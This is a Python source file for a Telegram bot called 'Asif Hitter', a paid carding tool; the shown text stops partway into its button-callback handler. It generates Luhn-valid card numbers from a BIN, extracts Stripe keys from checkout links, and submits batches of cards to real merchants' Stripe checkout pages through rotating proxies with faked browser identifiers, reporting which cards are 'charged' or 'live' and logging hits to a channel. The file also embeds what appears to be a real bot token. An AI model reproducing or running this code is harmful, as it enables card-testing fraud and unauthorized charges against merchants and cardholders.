"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT ⚡
Stripe Payment Checker | Proxy System | Key System
Dev: Asif Sakhani (@Asifsakhani786)
Version: 2.0 Premium

Required: pip install python-telegram-bot aiohttp
"""

import asyncio, json, os, random, re, time, base64
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO, BytesIO
from typing import Optional, Tuple

import aiohttp
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    InputFile, BotCommand, Message, CallbackQuery
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode, ChatAction
from telegram.helpers import escape_markdown

# ═══════════════════════════════════════════════════════
# CONFIG — CHANGE THESE
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8737062520:AAFT0TbyBqg_sipBAoLPdg0sqE8NqKtJP6o"
ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"
LOG_CHANNEL = "@asifhitter"  # channel for logs

# ═══════════════════════════════════════════════════════
# PREMIUM ANIMATED EMOJI IDs
# ═══════════════════════════════════════════════════════

ANIMATED = {
    "⚠️": "6098337704682984714",
    "🛑": "6325507973896472524",
    "👋": "6026306335715365949",
    "❤️": "5287446418909328171",
    "💙": "5285528007342058142",
    "💚": "5287724290408477329",
    "💛": "5287501467505161665",
    "💜": "5287590605256418477",
    "💎": "6026031174340579961",
    "⭐️": "5285074982781610729",
    "🦋": "5287474383441390368",
}

PREMIUM_EMOJI = {
    "✅": "5444987348334965906", "❌": "5447647474984449520",
    "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "💳": "5447453226498552490", "💠": "5870498447068502918",
    "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "👑": "5303547611351902889",
    "🔍": "5258396243666681152", "⏱️": "5303243514782443814",
    "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "🔑": "5454386656628991407",
    "🔗": "5447479640547428304", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552", "🛒": "5447319442562251569",
    "⛔": "5275969776668134187", "💰": "5283232570660634549",
    "🎯": "5444987348334965906", "🤖": "5219943216781995020",
    "📡": "5447448489149625830", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "ℹ️": "5289930378885214069",
    "📢": "5116445341150872576", "📌": "5447187153274567373",
}

# Helper: convert emoji to telegram animated format
def ae(emoji_text: str) -> str:
    """Return animated emoji for premium users"""
    eid = PREMIUM_EMOJI.get(emoji_text) or ANIMATED.get(emoji_text)
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{emoji_text}</tg-emoji>'
    return emoji_text

# ═══════════════════════════════════════════════════════
# FILE PATHS
# ═══════════════════════════════════════════════════════

DATA_DIR = "data"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"
RESULTS_DIR = f"{DATA_DIR}/results"
MAX_PROXIES_PER_USER = 6

# ═══════════════════════════════════════════════════════
# JSON HELPERS
# ═══════════════════════════════════════════════════════

def jload(path, default=None):
    if default is None: default = {}
    try:
        if os.path.exists(path):
            with open(path, "r") as f:
                return json.load(f)
    except: pass
    return default

def jsave(path, data):
    os.makedirs(os.path.dirname(path) if os.path.dirname(path) else ".", exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)

# ═══════════════════════════════════════════════════════
# PREMIUM SYSTEM
# ═══════════════════════════════════════════════════════

def is_premium(uid: int) -> bool:
    d = jload(PREMIUM_FILE, {"users": {}})
    u = d["users"].get(str(uid), {})
    if u:
        try:
            if datetime.now() < datetime.fromisoformat(u.get("expiry", "2000-01-01")):
                return True
        except: pass
    return False

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

# ═══════════════════════════════════════════════════════
# PROXY SYSTEM
# ═══════════════════════════════════════════════════════

def detect_proxy(pstr: str) -> Optional[str]:
    p = pstr.strip().lower()
    if p.startswith("http://"): return "http"
    if p.startswith("https://"): return "http"
    if p.startswith("socks4://"): return "socks4"
    if p.startswith("socks5://"): return "socks5"
    if ":" in p: return "http"
    return None

async def check_proxy(proxy: str, ptype: str = "http") -> Tuple[bool, str]:
    try:
        url = proxy if "://" in proxy else f"{ptype}://{proxy}"
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as s:
            async with s.get("https://api.stripe.com/v1", proxy=url, ssl=False) as r:
                return True, str(r.status)
    except Exception as e:
        return False, str(e)[:40]

def get_user_proxies(uid: int) -> list:
    d = jload(PROXY_FILE, {"users": {}})
    return d["users"].get(str(uid), [])

def save_user_proxies(uid: int, proxies: list):
    d = jload(PROXY_FILE, {"users": {}})
    d["users"][str(uid)] = proxies[:MAX_PROXIES_PER_USER]
    jsave(PROXY_FILE, d)

# ═══════════════════════════════════════════════════════
# CARD GENERATOR
# ═══════════════════════════════════════════════════════

def luhn(partial: str) -> str:
    for d in range(10):
        t = partial + str(d)
        s = sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) 
                for i,c in enumerate(t[::-1]))
        if s%10==0: return str(d)
    return "0"

def card_len(bin_: str) -> int:
    p2, p3 = bin_[:2], bin_[:3]
    if p2 in ("34","37"): return 15
    if p2 in ("30","36","38") or p3 in ("300","305"): return 14
    return 16

def gen_card(bin_str: str) -> dict:
    parts = bin_str.strip().split("|")
    raw = re.sub(r"[^0-9xX]", "", parts[0])
    c = "".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw)
    ln = card_len(c)
    if len(c) >= ln: c = c[:ln-1]
    while len(c) < ln-1: c += str(random.randint(0,9))
    c += luhn(c)
    yr = datetime.now().year
    mm = str(random.randint(1,12)).zfill(2)
    yy = str(yr+random.randint(1,6))[-2:]
    cvl = 4 if card_len(raw) in (15,14) and raw[:2] in ("34","37") else 3
    cvv = str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc": c, "mo": mm, "yr": yy, "cv": cvv, "f": f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════════════════════════════════
# STRIPE CHECKER (ASYNC)
# ═══════════════════════════════════════════════════════

class SC:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy = proxy
        self.pk = self.cs = None
        self.mer = "Unknown"
        self.amt = "N/A"
        self.amt_raw = 0
        self.chk = ""
        self.sub = 0
        self.cname = "John Smith"
        self.cemail = "john@example.com"
        self.cc = "US"; self.cl1 = "476 West White Mountain Blvd"
        self.ccity = "Pinetop"; self.cst = "AZ"; self.czip = "85929"
        self.muid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"
        self.sid = f"{random.getrandbits(32):08x}"
        self.guid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"

    def _decode(self):
        m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
        if m: self.cs = m.group(0)
        if '#' in self.url:
            try:
                hp = self.url.split('#')[1]
                dc = base64.b64decode(unquote(hp))
                xr = ''.join(chr(b^5) for b in dc)
                m2 = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xr)
                if m2: self.pk = m2.group(0)
            except: pass

    def _hdr(self) -> dict:
        return {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Authorization": f"Bearer {self.pk}",
        }

    async def init(self) -> bool:
        self._decode()
        if not self.pk or not self.cs:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as s:
                    async with s.get(self.url, proxy=self.proxy, ssl=False) as r:
                        h = await r.text()
                        if not self.cs:
                            m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.cs = m.group(0)
                        if not self.pk:
                            m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.pk = m.group(0)
            except: pass
        if not self.cs or not self.pk: return False
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as s:
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=self._hdr(),
                    data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",
                    proxy=self.proxy, ssl=False
                ) as r:
                    d = await r.json()
        except: return False
        
        if "error" in d: return False
        
        ac = d.get("account_settings") or {}
        self.mer = ac.get("display_name") or ac.get("business_name") or "Unknown"
        lg = d.get("line_item_group") or {}
        iv = d.get("invoice") or {}
        pi = d.get("payment_intent") or {}
        am = lg.get("total",0) or iv.get("total",0) or pi.get("amount",0)
        cu = (lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
        self.amt_raw = am
        self.amt = f"${am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "Trial/$0")
        self.chk = d.get("init_checksum","")
        self.sub = lg.get("subtotal",0) if lg else am
        
        cu2 = d.get("customer") or {}
        ad = cu2.get("address") if cu2 else {}
        ad = ad or {}
        self.cname = cu2.get("name") or "John Smith"
        self.cemail = d.get("customer_email") or f"john{random.randint(100,999)}@gmail.com"
        self.cc = ad.get("country") or "US"
        self.cl1 = ad.get("line1") or "476 West White Mountain Blvd"
        self.ccity = ad.get("city") or "Pinetop"
        self.cst = ad.get("state") or "AZ"
        self.czip = ad.get("postal_code") or "85929"
        return True

    async def charge(self, card: dict) -> dict:
        res = {"card": card["f"], "st": "ERROR", "msg": "Unknown"}
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20)) as s:
                pmb = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                    f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                    f"&billing_details[name]={quote(self.cname)}&billing_details[email]={quote(self.cemail)}"
                    f"&billing_details[address][country]={self.cc}&billing_details[address][line1]={quote(self.cl1)}"
                    f"&billing_details[address][city]={quote(self.ccity)}&billing_details[address][postal_code]={self.czip}"
                    f"&billing_details[address][state]={self.cst}&key={self.pk}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                    f"&payment_user_agent={quote('stripe.js/f5e714652c')}"
                    f"&time_on_page={random.randint(25000,55000)}&pasted_fields={quote('number')}"
                )
                async with s.post("https://api.stripe.com/v1/payment_methods",
                                  headers=self._hdr(), data=pmb, proxy=self.proxy, ssl=False) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    cd = pm["error"].get("decline_code","")
                    mg = pm["error"].get("message","")
                    if cd in ("incorrect_cvc","insufficient_funds") or any(x in mg.lower() for x in ("cvc","cvv","security code")):
                        res["st"], res["msg"] = "LIVE", f"CVC MATCH" if "cvc" in mg.lower() else "INSUFFICIENT FUNDS"
                    else:
                        res["st"], res["msg"] = "DECLINED", mg[:80]
                    return res
                
                pmid = pm.get("id")
                if not pmid: return res
                
                cfb = (
                    f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                    f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={self.pk}"
                    f"&init_checksum={quote(self.chk)}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                )
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  headers=self._hdr(), data=cfb, proxy=self.proxy, ssl=False) as r:
                    cf = await r.json()
                
                if "error" in cf:
                    er = cf["error"]
                    cd = er.get("decline_code","")
                    mg = er.get("message","")
                    if "captcha" in mg.lower(): res["st"], res["msg"] = "HCAPTCHA", "Captcha"
                    elif cd in ("challenge_required","require_action"): res["st"], res["msg"] = "3DS", "3DS Required"
                    elif cd in ("incorrect_cvc","insufficient_funds"): res["st"], res["msg"] = "LIVE", cd
                    else: res["st"], res["msg"] = "DECLINED", mg[:80]
                else:
                    pi2 = cf.get("payment_intent") or {}
                    st2 = pi2.get("status","") or cf.get("status","")
                    if st2 == "succeeded": res["st"], res["msg"] = "CHARGED", "PAYMENT SUCCESSFUL!"
                    elif st2 == "requires_action": res["st"], res["msg"] = "3DS", "3DS Required"
                    else: res["st"], res["msg"] = "ERROR", st2
        except Exception as e:
            res["msg"] = str(e)[:60]
        return res

# ═══════════════════════════════════════════════════════
# BOT COMMANDS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    prem = is_premium(uid)
    adm = is_admin(uid)
    
    badge = f"{ae('👑')} PREMIUM" if prem else f"{ae('⛔')} FREE"
    
    kb = [
        [InlineKeyboardButton(f"{ae('🌐')} Gateway Check", callback_data="gate_help")],
        [InlineKeyboardButton(f"{ae('💳')} Hit Checkout", callback_data="hit_help")],
        [InlineKeyboardButton(f"{ae('🔐')} Proxy Manager", callback_data="proxy_menu")],
        [InlineKeyboardButton(f"{ae('🔑')} Redeem Key", callback_data="redeem_help")],
        [InlineKeyboardButton(f"{ae('👤')} My Status", callback_data="status")],
    ]
    if adm:
        kb.append([InlineKeyboardButton(f"{ae('⚡')} Admin Panel", callback_data="admin")])
    kb.append([InlineKeyboardButton(f"{ae('👋')} Dev: {DEV_NAME}", url=f"https://t.me/{DEV_USERNAME}")])
    
    txt = f"""
{ae('🚀')}{ae('🚀')}{ae('🚀')} *ASIF HITTER* {ae('🚀')}{ae('🚀')}{ae('🚀')}

{ae('🤖')} Status: {badge}
{ae('💎')} Version: v2.0 Premium

{ae('⭐️')} *Commands:*
{ae('🌐')} /gate — Check gateway info
{ae('💳')} /hit — Hit checkout (Premium)
{ae('🔐')} /addproxy — Add proxies
{ae('🔍')} /proxy — Check proxy status
{ae('🗑')} /rmproxy — Remove proxies
{ae('🔑')} /auth — Redeem premium key
{ae('👤')} /status — Premium status

{ae('❤️')} Dev: [{DEV_NAME}](https://t.me/{DEV_USERNAME})
"""
    await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

# ═══════════════ PROXY COMMANDS ═══════════════

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message
    
    # Get content
    content = ""
    if msg.document:
        f = await msg.document.get_file()
        fb = await f.download_as_bytearray()
        content = fb.decode("utf-8", errors="ignore")
    elif msg.text:
        content = msg.text.replace("/addproxy", "").strip()
    else:
        await msg.reply_text(f"{ae('❌')} Send proxy list or .txt file")
        return
    
    lines = [l.strip() for l in content.split("\n") if l.strip()]
    if not lines:
        await msg.reply_text(f"{ae('❌')} No proxies found")
        return
    
    current = get_user_proxies(uid)
    slots_left = MAX_PROXIES_PER_USER - len(current)
    if slots_left <= 0:
        await msg.reply_text(f"{ae('⛔')} Proxy limit reached! ({MAX_PROXIES_PER_USER} max)\nUse /rmproxy first")
        return
    
    st = await msg.reply_text(f"{ae('⏳')} Checking proxies...")
    added = 0
    
    for pline in lines[:slots_left*2]:  # check double to find live ones
        if added >= slots_left: break
        pt = detect_proxy(pline)
        if not pt: continue
        live, _ = await check_proxy(pline, pt)
        if live:
            pkey = pline if "://" in pline else f"{pt}://{pline}"
            if pkey not in current:
                current.append(pkey)
                added += 1
    
    save_user_proxies(uid, current)
    
    await st.edit_text(
        f"{ae('✅')} *Proxies Added!*\n\n"
        f"{ae('📦')} Added: *{added}*\n"
        f"{ae('📊')} Total: *{len(current)}/{MAX_PROXIES_PER_USER}*\n"
        f"{ae('💠')} Slots left: *{MAX_PROXIES_PER_USER-len(current)}*",
        parse_mode=ParseMode.MARKDOWN
    )

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    proxies = get_user_proxies(uid)
    
    if not proxies:
        await update.message.reply_text(f"{ae('❌')} No proxies saved. Use /addproxy")
        return
    
    st = await update.message.reply_text(f"{ae('⏳')} Checking all proxies...")
    result = []
    live_c = 0
    
    for p in proxies:
        pt = detect_proxy(p) or "http"
        is_live, info = await check_proxy(p, pt)
        status = f"{ae('✅')} LIVE" if is_live else f"{ae('❌')} DEAD"
        if is_live: live_c += 1
        result.append(f"{status} | `{p[:40]}` | {info}")
    
    txt = f"{ae('📡')} *PROXY STATUS*\n\n"
    txt += f"{ae('💠')} Live: *{live_c}* | Dead: *{len(proxies)-live_c}* | Total: *{len(proxies)}*\n\n"
    txt += "\n".join(result[:15])
    if len(result) > 15:
        txt += f"\n\n{ae('ℹ️')} ...and {len(result)-15} more"
    
    await st.edit_text(txt, parse_mode=ParseMode.MARKDOWN)

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    current = get_user_proxies(uid)
    
    if not current:
        await update.message.reply_text(f"{ae('❌')} No proxies to remove")
        return
    
    # Show proxy list with numbers
    txt = f"{ae('🗑')} *REMOVE PROXY*\n\nSelect number to remove:\n\n"
    for i, p in enumerate(current, 1):
        txt += f"*{i}.* `{p[:50]}`\n"
    txt += f"\n{ae('ℹ️')} Usage: `/rmproxy 1` or `/rmproxy all`"
    
    if ctx.args:
        arg = ctx.args[0]
        if arg.lower() == "all":
            save_user_proxies(uid, [])
            await update.message.reply_text(f"{ae('✅')} All proxies removed!")
            return
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(current):
                removed = current.pop(idx)
                save_user_proxies(uid, current)
                await update.message.reply_text(f"{ae('✅')} Removed: `{removed[:50]}`", parse_mode=ParseMode.MARKDOWN)
            else:
                await update.message.reply_text(f"{ae('❌')} Invalid number")
        except:
            await update.message.reply_text(f"{ae('❌')} Invalid number")
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN)

# ═══════════════ GATEWAY ═══════════════

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(f"{ae('⚠️')} Usage: `/gate <stripe_url>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    url = ctx.args[0]
    uid = update.effective_user.id
    proxies = get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{ae('⏳')} Fetching gateway...")
    
    ck = SC(url, proxy)
    ok = await ck.init()
    
    if ok:
        await st.edit_text(
            f"{ae('🌐')} *GATEWAY INFO*\n\n"
            f"{ae('📦')} Merchant: *{escape_markdown(ck.mer,2)}*\n"
            f"{ae('💰')} Amount: *{escape_markdown(ck.amt,2)}*\n"
            f"{ae('🔑')} PK: `{ck.pk[:25]}...`\n"
            f"{ae('🔗')} CS: `{ck.cs[:25]}...`\n\n"
            f"{ae('✅')} Gateway is LIVE",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await st.edit_text(f"{ae('❌')} Failed to fetch gateway")

# ═══════════════ HIT (PREMIUM) ═══════════════

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if not is_premium(uid) and not is_admin(uid):
        await update.message.reply_text(
            f"{ae('🚫')} *ACCESS DENIED*\n\n"
            f"{ae('⛔')} Premium feature!\n"
            f"{ae('🔑')} Use /auth <key> to activate\n"
            f"{ae('👤')} Contact: [{DEV_NAME}](https://t.me/{DEV_USERNAME})",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if len(ctx.args) < 2:
        await update.message.reply_text(
            f"{ae('⚠️')} Usage: `/hit <url> <bin>`\n"
            f"{ae('💳')} Example: `/hit https://... 37936303`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    url = ctx.args[0]
    bin_in = ctx.args[1]
    
    proxies = get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{ae('🚀')} *Initializing...*", parse_mode=ParseMode.MARKDOWN)
    
    ck = SC(url, proxy)
    if not await ck.init():
        await st.edit_text(f"{ae('❌')} Failed to init session")
        return
    
    cards = [gen_card(bin_in) for _ in range(10)]
    
    res = {"CHARGED": 0, "LIVE": 0, "3DS": 0, "DECLINED": 0, "HCAPTCHA": 0, "ERROR": 0}
    charged_c = []
    live_c = []
    
    for i, card in enumerate(cards):
        # Update attempt message
        att_text = f"""
{ae('🚀')} *ASIF HITTER* {ae('💳')}

{ae('📦')} Merchant: *{escape_markdown(ck.mer,2)}*
{ae('💰')} Amount: *{escape_markdown(ck.amt,2)}*
{ae('💳')} BIN: `{bin_in[:8]}xxxx`

{ae('⏳')} Attempt: *{i+1}/10*
{ae('🎯')} Card: `{card['cc'][:6]}xxxxxx{card['cc'][-4:]}`

{ae('📊')} 🟢: *{res['CHARGED']}* 🔵: *{res['LIVE']}* 🟡: *{res['3DS']}* 🔴: *{res['DECLINED']}*
"""
        try:
            await st.edit_text(att_text, parse_mode=ParseMode.MARKDOWN)
        except: pass
        
        r = await ck.charge(card)
        sts = r["st"]
        if sts in res: res[sts] += 1
        else: res[sts] = 1
        
        if sts == "CHARGED": charged_c.append(r["card"])
        elif sts == "LIVE": live_c.append(r["card"])
    
    # Final dashboard
    dash = f"""
{ae('👑')} *RESULTS* {ae('👑')}

{ae('📦')} *{escape_markdown(ck.mer,2)}*
{ae('💰')} *{escape_markdown(ck.amt,2)}*

{ae('✅')} Charged: *{res['CHARGED']}*
{ae('💎')} Live: *{res['LIVE']}*
🟡 3DS: *{res['3DS']}*
🔴 Declined: *{res['DECLINED']}*
{ae('⛔')} Captcha: *{res.get('HCAPTCHA',0)}*
⚪ Error: *{res.get('ERROR',0)}*

{ae('📊')} Total: *10* cards
"""
    if charged_c:
        dash += f"\n{ae('🔥')} *CHARGED:*\n"
        for c in charged_c:
            dash += f"{ae('✅')} `{c}`\n"
    if live_c:
        dash += f"\n{ae('💎')} *LIVE:*\n"
        for c in live_c:
            dash += f"{ae('⭐️')} `{c}`\n"
    
    dash += f"\n{ae('👤')} [{DEV_NAME}](https://t.me/{DEV_USERNAME})"
    
    await st.edit_text(dash, parse_mode=ParseMode.MARKDOWN)
    
    # Log to channel
    if LOG_CHANNEL and (charged_c or live_c):
        try:
            log_text = f"""
{ae('🔥')} *HIT LOG*
{ae('👤')} User: [{update.effective_user.full_name}](tg://user?id={uid})
{ae('📦')} Merchant: {ck.mer}
{ae('💰')} Amount: {ck.amt}
{ae('✅')} Charged: {len(charged_c)} | {ae('💎')} Live: {len(live_c)}
"""
            await ctx.bot.send_message(LOG_CHANNEL, log_text, parse_mode=ParseMode.MARKDOWN)
        except: pass

# ═══════════════ AUTH & KEYS ═══════════════

async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if not ctx.args:
        await update.message.reply_text(f"{ae('⚠️')} Usage: `/auth <key>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    key = ctx.args[0].upper()
    kd = jload(KEYS_FILE, {"keys": {}})
    
    if key not in kd["keys"]:
        await update.message.reply_text(f"{ae('❌')} Invalid key!")
        return
    
    kdata = kd["keys"][key]
    if kdata.get("used"):
        await update.message.reply_text(f"{ae('❌')} Key already used!")
        return
    
    days = kdata["days"]
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    
    kdata["used"] = True
    kdata["used_by"] = uid
    kdata["expiry"] = expiry
    jsave(KEYS_FILE, kd)
    
    pd = jload(PREMIUM_FILE, {"users": {}})
    pd["users"][str(uid)] = {
        "name": update.effective_user.full_name,
        "username": update.effective_user.username or "",
        "activated": datetime.now().isoformat(),
        "expiry": expiry,
        "key": key,
        "plan": f"{days} day(s)"
    }
    jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(
        f"{ae('🎉')}{ae('🎉')}{ae('🎉')} *CONGRATULATIONS!* {ae('🎉')}{ae('🎉')}{ae('🎉')}\n\n"
        f"{ae('👑')} You have *PREMIUM ACCESS* to Asif Hitter!\n\n"
        f"{ae('⏱️')} Expires: `{expiry[:10]}`\n"
        f"{ae('💎')} Plan: `{days} day(s)`\n\n"
        f"{ae('🚀')} Use /hit to start!\n"
        f"{ae('❤️')} Welcome to Premium!",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Log
    if LOG_CHANNEL:
        try:
            await ctx.bot.send_message(
                LOG_CHANNEL,
                f"{ae('🎉')} *KEY REDEEMED*\n"
                f"{ae('👤')} User: [{update.effective_user.full_name}](tg://user?id={uid})\n"
                f"{ae('🔑')} Key: `{key}`\n"
                f"{ae('⏱️')} Plan: {days} day(s)\n"
                f"{ae('📅')} Expires: {expiry[:10]}",
                parse_mode=ParseMode.MARKDOWN
            )
        except: pass

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if is_premium(uid):
        pd = jload(PREMIUM_FILE)
        u = pd["users"].get(str(uid), {})
        await update.message.reply_text(
            f"{ae('👑')} *PREMIUM ACTIVE*\n\n"
            f"{ae('⏱️')} Expires: `{u.get('expiry','?')[:10]}`\n"
            f"{ae('💎')} Plan: `{u.get('plan','?')}`\n"
            f"{ae('✅')} All features unlocked!",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            f"{ae('⛔')} *FREE USER*\n\n{ae('🔑')} Use /auth <key> to upgrade",
            parse_mode=ParseMode.MARKDOWN
        )

# ═══════════════ ADMIN ═══════════════

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(f"{ae('🚫')} Admin only!")
        return
    
    if len(ctx.args) < 3:
        await update.message.reply_text(f"{ae('⚠️')} Usage: `/genkey 10 7 PREMIUM`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        count, days = int(ctx.args[0]), int(ctx.args[1])
        prefix = ctx.args[2].upper()
    except:
        await update.message.reply_text(f"{ae('❌')} Invalid format")
        return
    
    kd = jload(KEYS_FILE, {"keys": {}})
    new = []
    for _ in range(count):
        k = f"{prefix}-{random.randint(1000,9999)}-{random.randint(1000,9999)}"
        kd["keys"][k] = {"days": days, "used": False, "used_by": None, "created": datetime.now().isoformat()}
        new.append(k)
    jsave(KEYS_FILE, kd)
    
    txt = f"{ae('🎁')} *KEYS GENERATED*\n\n{ae('📦')} Count: *{count}*\n{ae('⏱️')} Duration: *{days} day(s)*\n\n"
    txt += "\n".join([f"{ae('🔑')} `{k}`" for k in new])
    
    # Send as file if too many
    if len(new) > 15:
        buf = StringIO("\n".join(new))
        buf.name = "keys.txt"
        await update.message.reply_document(InputFile(buf, filename="keys.txt"), caption=f"{count} keys generated ({days} days)")
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN)

async def cmd_premium_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    pd = jload(PREMIUM_FILE, {"users": {}})
    users = pd.get("users", {})
    
    if not users:
        await update.message.reply_text(f"{ae('❌')} No premium users")
        return
    
    txt = f"{ae('👑')} *PREMIUM USERS*\n\n"
    for uid, u in users.items():
        try:
            exp = datetime.fromisoformat(u.get("expiry","2000-01-01"))
            active = "🟢" if datetime.now() < exp else "🔴"
            txt += f"{active} [{u.get('name','?')}](tg://user?id={uid})\n"
            txt += f"   {ae('⏱️')} Expires: `{u.get('expiry','?')[:10]}`\n"
            txt += f"   {ae('💎')} Plan: `{u.get('plan','?')}`\n\n"
        except: pass
    
    await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN)

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if not ctx.args:
        await update.message.reply_text(f"{ae('⚠️')} Usage: `/rmsub <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    uid = ctx.args[0]
    pd = jload(PREMIUM_FILE, {"users": {}})
    
    if uid not in pd.get("users", {}):
        await update.message.reply_text(f"{ae('❌')} User not found")
        return
    
    del pd["users"][uid]
    jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(f"{ae('✅')} User premium removed!")
    try:
        await ctx.bot.send_message(int(uid), f"{ae('⛔')} Your premium has been revoked by admin.")
    except: pass

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    msg = update.message.text.replace("/broadcast", "").strip()
    if not msg:
        await update.message.reply_text(f"{ae('⚠️')} Usage: `/broadcast <message>`")
        return
    
    pd = jload(PREMIUM_FILE, {"users": {}})
    sent = 0
    for uid in pd.get("users", {}):
        try:
            await ctx.bot.send_message(int(uid), f"{ae('📢')} *BROADCAST*\n\n{msg}", parse_mode=ParseMode.MARKDOWN)
            sent += 1
        except: pass
    
    await update.message.reply_text(f"{ae('✅')} Broadcast sent to *{sent}* users", parse_mode=ParseMode.MARKDOWN)

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    global LOG_CHANNEL
    if ctx.args:
        LOG_CHANNEL = ctx.args[0]
        await update.message.reply_text(f"{ae('✅')} Log channel set to: {LOG_CHANNEL}")
    else:
        await update.message.reply_text(f"{ae('ℹ️')} Current log channel: {LOG_CHANNEL}\nUsage: `/sethits @channel`")

# ═══════════════ CALLBACKS ═══════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
